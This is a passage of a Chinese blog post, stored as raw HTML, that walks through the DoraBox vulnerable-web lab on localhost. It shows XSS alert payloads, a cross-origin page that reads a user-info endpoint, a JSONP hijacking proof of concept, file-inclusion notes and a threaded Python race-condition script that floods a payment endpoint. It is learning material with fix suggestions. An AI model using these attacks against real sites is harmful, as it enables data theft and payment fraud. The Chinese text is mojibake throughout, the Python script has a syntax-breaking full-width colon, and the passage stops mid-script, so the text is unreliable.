12345678ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æœåŠ¡å™¨è¿”å›äº†è¾“å…¥çš„å­—ç¬¦æ•°ç»Ÿè®¡ï¼Œä»¥åŠè¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œåœ¨ html ä¸­</p>\n<p><img src=\"dorabox_xss_ref001.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-12\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-12\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>åŠ å…¥ js ä»£ç ï¼Œalert ä¸€ä¸‹<img src=\"dorabox_xss_ref002.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"æ€»ç»“-12\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-12\">#</a> æ€»ç»“ï¼š</h2>\n<p>â€‹\tXSS åå°„å‹ï¼Œå°±æ˜¯é€šè¿‡ get æˆ–è€… post è¯·æ±‚ï¼Œè¢«åå°å¤„ç†è¿‡æ•°æ®ï¼Œå¹¶å“åº”åˆ°å‰ç«¯é¡µé¢ä¸Šã€‚å¯ä»¥é€šè¿‡ä½¿ç”¨ç™½åå•è¿‡æ»¤æ‰è¾“å…¥çš„æ¶æ„å­—ç¬¦è¿›è¡Œä¿®å¤ã€‚</p>\n<h1 id=\"å­˜å‚¨å‹xss\"><a class=\"markdownIt-Anchor\" href=\"#å­˜å‚¨å‹xss\">#</a> å­˜å‚¨å‹ XSS</h1>\n<p><img src=\"dorabox_xss_sav001.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-13\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-13\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>alert è¯•ä¸€ä¸‹</li>\n</ol>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert(<span class=\"string\">&quot;/XSS/&quot;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_xss_sav001.png\" alt=\"\"></p>\n<ol start=\"2\">\n<li>submit åè¿”å›äº†å­—ç¬¦æ•°ï¼Œæ²¡æœ‰ alertï¼Œåˆ·æ–°ä¸€ä¸‹ï¼Œé‡æ–°åŠ è½½ï¼Œå‘ç°å­˜å‚¨æˆåŠŸ</li>\n</ol>\n<p><img src=\"dorabox_xss_sav002.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“-13\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-13\">#</a> æ€»ç»“ï¼š</h2>\n<p>å­˜å‚¨å‹å°±æ˜¯æŠŠç”¨æˆ·è¾“å…¥çš„æ¶æ„å­—ç¬¦ä¸²å­˜å‚¨åœ¨æœåŠ¡å™¨ï¼ˆæ•°æ®åº“ï¼‰ï¼Œä¸€èˆ¬åœ¨å¯ä»¥å­˜å‚¨æ•°æ®å¹¶ä¼šè¿”å›åˆ°å‰ç«¯ä»£ç çš„åœ°æ–¹æå§ï¼Œåˆ«çš„ç”¨æˆ·ç‚¹äº†ï¼Œå°±ä¼šè·³åˆ°å°é»‘å±‹è¿™ç§ã€‚æˆ–è€…åˆ©ç”¨ä¸€äº›å¹³å°è„šæœ¬æäº‹æƒ…ã€‚</p>\n<p>æ¼æ´ä¿®å¤ï¼šåœ¨æœåŠ¡ç«¯è¿‡æ»¤æ‰ HTML çš„å°–æ‹¬å·ï¼Œæ¯”å¦‚ php çš„è‡ªå¸¦å‡½æ•° strip_tags ()ï¼Œç„¶åå¯¹äºä¸€äº›å¯ä»¥æ‰§è¡Œçš„å‡½æ•°è¿›è¡Œæ‰‹åŠ¨å†™å‡½æ•°è¿‡æ»¤ï¼Œè¿‡æ»¤æ‰ onchange (),onload (),onclick (),onerror () ç­‰ç­‰å‡½æ•°</p>\n<h1 id=\"domå‹xss\"><a class=\"markdownIt-Anchor\" href=\"#domå‹xss\">#</a> DOM å‹ XSS</h1>\n<p><img src=\"dorabox_xss_sav001.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-14\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-14\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>\n<p>ä¸‡èƒ½ alertï¼Œ<script>alert(1)</script>ï¼š<img src=\"dorabox_xss_dom001.png\" alt=\"\"></p>\n<p>å¸¦æœ‰ xss çš„ urlï¼š<a href=\"http://localhost/dorabox/xss/dom_xss.php?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;submit=submit\">http://localhost/dorabox/xss/dom_xss.php?name=&lt;script&gt;alert(1)&lt;%2Fscript&gt;&amp;submit=submit</a></p>\n</li>\n<li>\n<p>çœ‹æºç æ˜¯åœ¨è¿™é‡Œæ‰“å°çš„ï¼š <code>document.write(getURLValue('name'));</code></p>\n</li>\n</ol>\n<h2 id=\"æ€»ç»“-14\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-14\">#</a> æ€»ç»“ï¼š</h2>\n<p>DOM å‹ xssï¼Œä»…ä»…åœ¨å‰ç«¯é¡µé¢è¿›è¡Œæ“ä½œçš„ï¼Œé€šè¿‡ä¿®æ”¹é¡µé¢çš„ DOM èŠ‚ç‚¹å½¢æˆçš„ XSSï¼Œæ•ˆæœå’Œåå°„å‹ç±»ä¼¼ã€‚</p>\n<p>æ”»å‡»è€…åœ¨ URL ä¸­æ’å…¥ XSS ä»£ç ï¼Œå‰ç«¯é¡µé¢ç›´æ¥ä» url ä¸­è·å– xss ä»£ç å¹¶è¾“å‡ºåˆ°é¡µé¢ï¼Œå¯¼è‡´ xss ä»£ç çš„æ‰§è¡Œï¼Œæ”»å‡»è€…å°†å¸¦æœ‰ xss ä»£ç çš„ url å‘ç»™ç”¨æˆ·ï¼Œç”¨æˆ·æ‰“å¼€åæ”¶åˆ°æ”»å‡»ã€‚</p>\n<h1 id=\"csrfè·¨åŸŸèµ„æº\"><a class=\"markdownIt-Anchor\" href=\"#csrfè·¨åŸŸèµ„æº\">#</a> CSRF è·¨åŸŸèµ„æº</h1>\n<p><img src=\"dorabox_csrf_json001.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-15\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-15\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol username:Vulkey_Chen,mobilephone:13188888888,email:admin@gh0st.cn,address:\\u4e2d\\u534e\\u4eba\\u6c11\\u5171\\u548c\\u56fd,sex:CoolMan=\"\">\n<li>\n<p>æ„é€  html æ¥åŠ«æŒ</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Ajax<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Ajax å‘é€ get è¯·æ±‚<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ajax</span>(<span class=\"params\"></span>) </span>&#123; </span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.responseType = <span class=\"string\">&quot;text&quot;</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.open(<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;http://localhost/dorabox/csrf/userinfo.php&#x27;</span>, <span class=\"literal\">true</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.onreadystatechange= <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>) </span>&#123; </span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">this</span>.status == <span class=\"number\">200</span>)&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\talert(<span class=\"built_in\">this</span>.responseText);</span></span><br><span class=\"line\"><span class=\"javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"javascript\"> &#125;;</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.send();</span></span><br><span class=\"line\"><span class=\"javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"javascript\">ajax();</span></span><br><span class=\"line\"><span class=\"javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_csrf_ky001.png\" alt=\"\">å†…å®¹ï¼š</p>\n</li>\n</ol>\n<h2 id=\"æ€»ç»“-15\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-15\">#</a> æ€»ç»“ï¼š</h2>\n<pre><code>å®è¯å®è¯´ï¼Œè¿™ä¸ªå°±æ˜¯å€Ÿé‰´ç½‘ä¸Šçš„ï¼Œè§£é‡Šä¸€ä¸‹jsä»£ç ï¼š\n\nè‡ªå®šä¹‰ajax()æ–¹æ³•å¹¶æ‰§è¡Œï¼Œajaxå†…åˆ›å»ºXMLHttpRequestå¯¹è±¡ï¼Œè®¾ç½®å›åº”å†…å®¹çš„ç±»å‹ä¸ºtextã€‚\n\nç„¶åå‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨ï¼Œå…¶ä¸­ open(*method*,*url*,*async*)ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°trueä¸ºå¼‚æ­¥ï¼Œå¼‚æ­¥ JavaScript å’Œ XMLï¼ŒXMLHttpRequest å¯¹è±¡å¦‚æœè¦ç”¨äº AJAX çš„è¯ï¼Œå…¶ open() æ–¹æ³•çš„ async å‚æ•°å¿…é¡»è®¾ç½®ä¸º trueã€‚\n\nonreadystatechangeï¼šå­˜å‚¨å‡½æ•°ï¼ˆæˆ–å‡½æ•°åï¼‰ï¼Œæ¯å½“ readyState å±æ€§æ”¹å˜æ—¶ï¼Œå°±ä¼šè°ƒç”¨è¯¥å‡½æ•°ã€‚readyStateå­˜æœ‰ XMLHttpRequest çš„çŠ¶æ€ã€‚ä» 0 åˆ° 4 å‘ç”Ÿå˜åŒ–ã€‚\n</code></pre>\n<ul>\n<li>\n<p>0: è¯·æ±‚æœªåˆå§‹åŒ–</p>\n</li>\n<li>\n<p>1: æœåŠ¡å™¨è¿æ¥å·²å»ºç«‹</p>\n</li>\n<li>\n<p>2: è¯·æ±‚å·²æ¥æ”¶</p>\n</li>\n<li>\n<p>3: è¯·æ±‚å¤„ç†ä¸­</p>\n</li>\n<li>\n<p>4: è¯·æ±‚å·²å®Œæˆï¼Œä¸”å“åº”å·²å°±ç»ª</p>\n<p>status\t<br>\n200: â€œOKâ€ï¼Œ404: æœªæ‰¾åˆ°é¡µé¢</p>\n</li>\n</ul>\n<p>æœ€åå“åº”æˆåŠŸå°± alert è¿”å›çš„æ•°æ®</p>\n<p>function ajax() {<br>\nvar xhr = new XMLHttpRequest();<br>\nxhr.responseType = â€œtextâ€;<br>\nxhr.open(â€˜GETâ€™, â€˜<a href=\"http://localhost/dorabox/csrf/userinfo.php\">http://localhost/dorabox/csrf/userinfo.php</a>â€™, true);<br>\nxhr.onreadystatechange= function(e) {<br>\nif(this.status == 200){<br>\nalert(this.responseText);<br>\n}<br>\n};<br>\nxhr.send();<br>\n}<br>\najax();</p>\n<h1 id=\"jsonpåŠ«æŒ\"><a class=\"markdownIt-Anchor\" href=\"#jsonpåŠ«æŒ\">#</a> JSONP åŠ«æŒ</h1>\n<p><img src=\"dorabox_csrf_json001.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-16\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-16\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>\n<p>æ¥ä¸€ä¸ª csrf æ”»å‡»ä»£ç </p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>JSONPåŠ«æŒæµ‹è¯•<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\">result</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"javascript\">        </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            alert(result.address);</span></span><br><span class=\"line\"><span class=\"javascript\">        &#125;</span></span><br><span class=\"line\"><span class=\"javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://localhost/dorabox/csrf/jsonp.php?callback=test&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_csrf_json002.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"æ€»ç»“-16\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-16\">#</a> æ€»ç»“ï¼š</h2>\n<p>JSONP (JSON With Padding)ï¼Œæ˜¯ä¸€ç§ç‰¹æ®Šçš„ CSRF æ”»å‡»ï¼Œç›®çš„æ˜¯è·å–æ•æ„Ÿæ•°æ®ï¼Œå½“ JSON æ•°æ®å“åº”ç»™ç½‘ç«™æ—¶ï¼Œæµè§ˆå™¨ç«‹å³ä¼šè°ƒç”¨æ•°ç»„æˆ–è€…å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚æ­£æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹ï¼ŒæŠŠæ„é€ æ–¹æ³•æ›¿æ¢æˆæ¶æ„ä»£ç ï¼Œåœ¨æ„é€ æ–¹æ³•ä¸­æ·»åŠ å°† JSON æ•°æ®å‘é€ç»™ç¬¬ä¸‰æ–¹å³æ”»å‡»è€…çš„ä»£ç ã€‚</p>\n<p>æ²¡å†™è¿‡ï¼Œç¬¬ä¸€æ¬¡å†™ï¼Œå†™å®Œè·¨åŸŸå¥½åƒåˆå¤šæ‡‚äº†ä¸€ç‚¹ç‚¹ï¼ˆå¥½åƒçœŸçš„æ‡‚äº†ï¼Œä½†æ˜¯å…¥èŒåŸ¹è®­é‡Œå†™çš„æœ‰ç‚¹è¯¦ç»†ï¼‰ï¼Œæˆ‘å†™å®Œè¿™äº›è¦å†å¤šå†™å‡ é“é¢˜ï¼Œæ¥ä¸€ç‚¹ç”»é¢æ„Ÿã€‚</p>\n<h1 id=\"ä»»æ„æ–‡ä»¶åŒ…å«\"><a class=\"markdownIt-Anchor\" href=\"#ä»»æ„æ–‡ä»¶åŒ…å«\">#</a> ä»»æ„æ–‡ä»¶åŒ…å«</h1>\n<p><img src=\"dorabox_filein002.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-17\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-17\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>ç›´æ¥æ–‡ä»¶åŒ…å«ï¼Œè¾“å‡º<img src=\"dorabox_filein003.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"æ€»ç»“-17\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-17\">#</a> æ€»ç»“ï¼š</h2>\n<p>ç½‘ä¸Šçœ‹äº†å¾ˆå¤šé€šå…³è®°å½•ï¼Œå¯æ˜¯å¤§å®¶éƒ½æ˜¯ç›´æ¥åŒ…å«ï¼Œå¦‚æœä¸æ˜¯æœ¬åœ°é¶åœºï¼Œé‚£æ˜¯æ€ä¹ˆçŸ¥é“è·¯å¾„ä»¥åŠæ–‡ä»¶åçš„å‘¢ï¼Ÿæ˜¯ä¸æ˜¯è¦é…åˆæ–‡ä»¶ä¸Šä¼ ä¸€èµ·ï¼Ÿ</p>\n<h1 id=\"ä»»æ„æ–‡ä»¶åŒ…å«-2\"><a class=\"markdownIt-Anchor\" href=\"#ä»»æ„æ–‡ä»¶åŒ…å«-2\">#</a> ä»»æ„æ–‡ä»¶åŒ…å«</h1>\n<p><img src=\"dorabox_filein002.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-18\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-18\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>è¾“å…¥ 1ï¼Œå‘ç°é™åˆ¶åœ¨å½“å‰ç›®å½•ï¼Œä½†æ˜¯ä¸å½±å“è¦ç”¨çš„æ–‡ä»¶ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯ç›´æ¥åŒ…å«å°±å¯ä»¥äº†<img src=\"dorabox_filein004.png\" alt=\"\"><img src=\"dorabox_filein003.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"æ€»ç»“-18\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-18\">#</a> æ€»ç»“ï¼š</h2>\n<p>â€¦/ åº”è¯¥å¯ä»¥çªç ´æŠŠ</p>\n<h1 id=\"æ¡ä»¶ç«äº‰-æ”¯ä»˜\"><a class=\"markdownIt-Anchor\" href=\"#æ¡ä»¶ç«äº‰-æ”¯ä»˜\">#</a> æ¡ä»¶ç«äº‰ - æ”¯ä»˜</h1>\n<p>é¶åœºå‡ºäº†ç‚¹é—®é¢˜ï¼Œé¡µé¢æŠ¥ php è¯­æ³•é”™</p>\n<p>ä½†æ˜¯è¯­æ³•å¹¶æ²¡æœ‰å‡ºé”™ï¼Œç™¾åº¦äº†è¯´æ˜¯ php ç‰ˆæœ¬çš„é—®é¢˜ï¼Œä½†æ˜¯æˆ‘åŸºæœ¬æ¯ä¸ªç‰ˆæœ¬éƒ½è¯•è¿‡ä¸”é‡å¯äº†ï¼Œä½†æ˜¯æ²¡æœ‰è§£å†³</p>\n<p>ä¸è¿‡åæ­£è¿™ä¸ªé¢˜è¦å†™è„šæœ¬ï¼Œæˆ‘ä¹Ÿä¸å¤ªä¼šï¼Œå¹²è„†è·Ÿç€æŠŠ poc æ’¸äº†ä¸€é</p>\n<h2 id=\"è¿‡ç¨‹-19\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-19\">#</a> è¿‡ç¨‹ï¼š</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> queue</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    ä¸‰ä¸ªå˜é‡</span></span><br><span class=\"line\"><span class=\"string\">    urlï¼šè¦æµ‹è¯•çš„ç½‘ç«™åœ°å€</span></span><br><span class=\"line\"><span class=\"string\">    threadsï¼šçº¿ç¨‹æ•°</span></span><br><span class=\"line\"><span class=\"string\">    qï¼šè°ƒç”¨queueæ„é€ æ–¹æ³•ï¼Œå¯¹åˆ—é˜Ÿå¤§å°ä¸è®¾é™</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">url=<span class=\"string\">&quot;http://localhost/dorabox/race_condition/pay.php&quot;</span></span><br><span class=\"line\">threads=<span class=\"number\">25</span></span><br><span class=\"line\">q=queue.Queue()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># åœ¨åˆ—é˜Ÿä¸­åŠ å…¥50ä¸ªå…ƒç´ ,0-49</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">50</span>):</span><br><span class=\"line\">    q.put(i)   </span><br><span class=\"line\"><span class=\"comment\"># å®šä¹‰postå‡½æ•°ï¼Œå‘50ä¸ªä¸€å—é’±</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">post</span>():</span> </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># å½“qé‡Œé¢è¿˜æœ‰å…ƒç´ æ—¶,å°±è·å–å…ƒç´ ï¼Œå‘é€ä¸€ä¸ªpostè¯·æ±‚æ”¯ä»˜ä¸€å—é’±</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> q.empty():</span><br><span class=\"line\">        q.get() </span><br><span class=\"line\">        <span class=\"comment\"># Requestsä»¥formè¡¨å•å½¢å¼å‘é€postè¯·æ±‚ï¼Œæ”¯ä»˜è¾“å…¥æ¡†nameæ˜¯moneyå˜›</span></span><br><span class=\"line\">        <span class=\"comment\"># data = &#123;&#x27;key1&#x27;:&#x27;value1&#x27;,...&#125;</span></span><br><span class=\"line\">        r = requests.post(url, data = &#123;<span class=\"string\">&#x27;money&#x27;</span> : <span class=\"number\">1</span>&#125;)</span><br><span class=\"line\">        r.encoding = <span class=\"string\">&#x27;utf-8&#x27;</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(r.text)</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">ä¸€ä¸ªpythonæ–‡ä»¶é€šå¸¸æœ‰ä¸¤ç§ä½¿ç”¨æ–¹æ³•,</span></span><br><span class=\"line\"><span class=\"string\"> ç¬¬ä¸€æ˜¯ä½œä¸ºè„šæœ¬ç›´æ¥æ‰§è¡Œï¼Œ</span></span><br><span class=\"line\"><span class=\"string\"> ç¬¬äºŒæ˜¯ import åˆ°å…¶ä»–çš„ python è„šæœ¬ä¸­è¢«è°ƒç”¨ï¼ˆæ¨¡å—é‡ç”¨ï¼‰æ‰§è¡Œã€‚</span></span><br><span class=\"line\"><span class=\"string\"> å› æ­¤if __name__ == &#x27;main&#x27;: çš„ä½œç”¨å°±æ˜¯:</span></span><br><span class=\"line\"><span class=\"string\"> æ§åˆ¶è¿™ä¸¤ç§æƒ…å†µæ‰§è¡Œä»£ç çš„è¿‡ç¨‹ï¼Œåœ¨if __name__ == &#x27;main&#x27;: ä¸‹çš„ä»£ç åªæœ‰åœ¨ç¬¬ä¸€ç§æƒ…å†µä¸‹ï¼ˆå³æ–‡ä»¶ä½œä¸ºè„šæœ¬ç›´æ¥æ‰§è¡Œï¼‰æ‰ä¼šè¢«æ‰§è¡Œï¼Œè€Œ import åˆ°å…¶ä»–è„šæœ¬ä¸­æ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ã€‚</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\"> æ¯ä¸ªpythonæ¨¡å—ï¼ˆpythonæ–‡ä»¶ï¼‰éƒ½åŒ…å«å†…ç½®çš„å˜é‡ __name__ï¼Œå½“è¯¥æ¨¡å—è¢«ç›´æ¥æ‰§è¡Œçš„æ—¶å€™ï¼Œ__name__ ç­‰äºæ–‡ä»¶åï¼ˆåŒ…å«åç¼€ .py ï¼‰ï¼›å¦‚æœè¯¥æ¨¡å— import åˆ°å…¶ä»–æ¨¡å—ä¸­ï¼Œåˆ™è¯¥æ¨¡å—çš„ __name__ ç­‰äºæ¨¡å—åç§°ï¼ˆä¸åŒ…å«åç¼€.pyï¼‰</span></span><br><span class=\"line\"><span class=\"string\"> è€Œâ€œ__main__â€ å§‹ç»ˆæŒ‡å½“å‰æ‰§è¡Œæ¨¡å—çš„åç§°ï¼ˆåŒ…å«åç¼€.pyï¼‰ã€‚è¿›è€Œå½“æ¨¡å—è¢«ç›´æ¥æ‰§è¡Œæ—¶ï¼Œ__name__ == &#x27;__main__&#x27; ç»“æœä¸ºçœŸã€‚</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\"> é‚£å…¶å®å°±æ˜¯ä¸»å‡½æ•°å‘—ï¼Œç¨‹åºè¿è¡Œå…¥å£ï¼Œä¸è¿‡ä¹Ÿæœ‰ç‚¹åŒºåˆ«å—·</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># ç”¨25ä¸ªçº¿ç¨‹ï¼Œåˆ†åˆ«å‘50ä¸ªä¸€å—é’±</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(threads)ï¼š</span><br><span class=\"line\">        t = threading.Thread(target=post) <span class=\"comment\"># ç›®æ ‡å¯¹è±¡æ˜¯postå‡½æ•°</span></span><br><span class=\"line\">        t.start() <span class=\"comment\"># 